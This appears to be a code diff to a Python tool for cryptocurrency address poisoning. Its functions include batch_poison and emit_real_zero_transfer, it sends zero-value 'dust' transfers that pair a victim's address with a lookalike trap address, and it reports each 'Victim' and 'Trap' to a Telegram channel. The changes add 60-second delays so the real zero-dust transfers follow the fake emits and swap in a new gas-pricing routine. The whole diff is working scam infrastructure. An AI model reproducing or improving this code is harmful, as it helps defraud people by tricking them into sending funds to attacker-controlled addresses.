@@ -1354,7 +1354,7 @@ def emit_real_zero_transfer(
                     "maxPriorityFeePerGas": tip_wei,
                 }
         else:
-            gas_params = get_real_dust_gas_params(
+            gas_params = get_smart_gas_params(
                 w3,
                 context="[real-zero][tx]",
                 campaign_id=campaign_id,
@@ -1526,7 +1526,7 @@ def emit_real_zero_batch_transfers(chunk, campaign_id, gas_params_override=None)
                     "maxPriorityFeePerGas": tip_wei,
                 }
         else:
-            gas_params = get_real_dust_gas_params(
+            gas_params = get_smart_gas_params(
                 w3,
                 context="[real-zero-batch]",
                 campaign_id=campaign_id,
@@ -1712,7 +1712,7 @@ def flush_real_zero_queue(queue, campaign_id, is_final=False):
     total_success = 0
     all_success_ids = []
 
-    gas_params = get_real_dust_gas_params(
+    gas_params = get_smart_gas_params(
         w3,
         context="[real-zero][batch]",
         campaign_id=campaign_id,
@@ -2566,6 +2566,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             poison_queue.clear()
             
             if REAL_DUST_ENABLED and real_queue:
+                logger.info(f"[real-zero] Fake batch done. Waiting 60 seconds before real zero-dust ({len(real_queue)} items)...")
+                time.sleep(60)
                 real_batch_success, _ = flush_real_zero_queue(real_queue, campaign_id, is_final=False)
                 real_success += real_batch_success
                 real_queue.clear()
@@ -2594,14 +2596,16 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         else:
             logger.error(f"[batch] ❌ Final multi-token batch failed")
 
-        if REAL_DUST_ENABLED and real_queue:
-            real_batch_success, _ = flush_real_zero_queue(real_queue, campaign_id, is_final=True)
-            real_success += real_batch_success
-            real_queue.clear()
+    if REAL_DUST_ENABLED and real_queue:
+        logger.info(f"[real-zero] Fake emit finished. Waiting 60 seconds before final real zero-dust ({len(real_queue)} items)...")
+        time.sleep(60)
+        real_batch_success, _ = flush_real_zero_queue(real_queue, campaign_id, is_final=True)
+        real_success += real_batch_success
+        real_queue.clear()
 
-        if REAL_DUST_ENABLED:
-            logger.info(f"[real-zero] Real zero-dust completed for this run: {real_success}")
-
+    if REAL_DUST_ENABLED:
+        logger.info(f"[real-zero] Real zero-dust completed for this run: {real_success}")
+        
         # Summary with gas failure information
     failed = total - success - skipped_dusted
     logger.info(f"Completed: {success}/{total} successful. Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})")
@@ -2617,6 +2621,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         )
     else:
         summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful.\n⏭️ Skipped (already dusted): {skipped_dusted}"
+        if REAL_DUST_ENABLED:
+            summary_msg += f"\n💧 Real zero-dust: {real_success} successful"
     
     send_telegram(summary_msg, campaign_id=campaign_id)
 
@@ -2695,6 +2701,35 @@ if __name__ == "__main__":
             )
             logger.info(success_msg)
             send_telegram(success_msg, campaign_id=campaign_id)
+
+            # 🆕 REAL ZERO-DUST: fire 60s after the fake emit (single mode)
+            if REAL_DUST_ENABLED:
+                logger.info("[real-zero] Fake emit done. Waiting 60 seconds before real zero-dust...")
+                time.sleep(60)
+
+                real_asset = choose_real_dust_asset(fetched_asset)
+                real_tx_hash, _, real_ok = emit_real_zero_transfer(
+                    args.victim_address,
+                    trap_address,
+                    real_asset,
+                    campaign_id,
+                )
+
+                if real_ok and real_tx_hash:
+                    real_msg = (
+                        f"💧 *Real Zero-Dust Emitted!*\n\n"
+                        f"🪙 Asset: {real_asset} (value: 0)\n"
+                        f"👤 [Victim]({get_explorer_url(args.victim_address)})\n"
+                        f"🪤 [Trap]({get_explorer_url(trap_address)})\n\n"
+                        f"🔗 [View TX on Explorer]({get_explorer_url(real_tx_hash, 'tx')})"
+                    )
+                    logger.info(real_msg)
+                    send_telegram(real_msg, campaign_id=campaign_id)
+                else:
+                    fail_msg = f"❌ Real zero-dust failed for {args.victim_address} ({real_asset})"
+                    logger.error(fail_msg)
+                    send_telegram(fail_msg, campaign_id=campaign_id)
+
             if job_id:
                 update_job(job_id, status='completed', progress=1, message='Mirror emitted')
         else:
